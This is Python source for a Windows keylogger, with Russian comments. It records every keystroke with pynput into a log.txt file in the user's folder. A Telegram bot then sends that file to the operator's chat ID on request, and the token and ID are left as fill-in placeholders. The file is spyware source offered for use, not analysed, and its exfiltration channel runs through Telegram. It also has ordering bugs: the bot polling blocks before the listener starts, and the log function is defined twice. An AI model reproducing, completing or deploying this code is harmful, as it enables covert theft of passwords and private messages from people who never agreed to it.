#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
#                    Импорт библиотек                                           #
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
import telebot
import time 
from pynput.keyboard import Listener, Key
import os # для работы с папками вивинды
import getpass # ну это типо для определения пути 
import random # для рандомизации на всякий случай, пусть будет)))
import time # для контроля над временем при проверке файлов
import ctypes 
import urllib.request
#from telebot import apihelper

#apihelper.proxy = {'https://socks?server=128.140.175.97&port=443'}
#Ip = 'russia-dd.proxy.digitalresistance.dog'
#Port = '443'
#apihelper.proxy = {'https': 'socks5://{}:{}'.format(Ip,Port)}



#++++++++++++++ТУТ АПИ БОТА++++++++++++++++#
bot = telebot.TeleBot("ТУТ АПИ ИЗ БОТФАЗЕРА")
ID = ТУТАЙДИ
сoc = os.environ.get("USERNAME")
t = time.localtime()
minute = t.tm_min
name = str(minute)
f = open('C:\\Users\\'+сoc+'\\log.txt', "a+")
f.write(name) 

def log(taste):
    t = time.localtime()
    minute = t.tm_min
    name = str(minute)    
    f = open('C:\\Users\\'+сoc+'\\log.txt', "a+")
    f.write(str(taste) + "\n") 



#бот
keyboard1 = telebot.types.ReplyKeyboardMarkup()
keyboard1.row('Получить текстовик')

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, 'Привет, я бот для кейлоггера', reply_markup=keyboard1)

@bot.message_handler(content_types=['text'])
def send_text(message):
    if message.text == 'Получить текстовик':
        bot.send_message(message.chat.id, 'Ок сейчас скину, погодь...')
        time.sleep(2)
        bot.send_message(message.chat.id, 'Вот, держи') 
        with open(r'C:\\Users\\'+сoc+'\\log.txt') as file:
         f=file.read()
        bot.send_document(ID, open(r'C:\\Users\\'+сoc+'\\log.txt'))

bot.polling()

with Listener(on_press=log) as listener:
    listener.join()

def log(taste):
    t = time.localtime()
    minute = t.tm_min
    name = str(minute)    
    f = open('C:\\Users\\'+сoc+'\\log.txt', "a+")
    f.write(str(taste) + "\n") 
with Listener(on_press=log) as listener:
    listener.join()
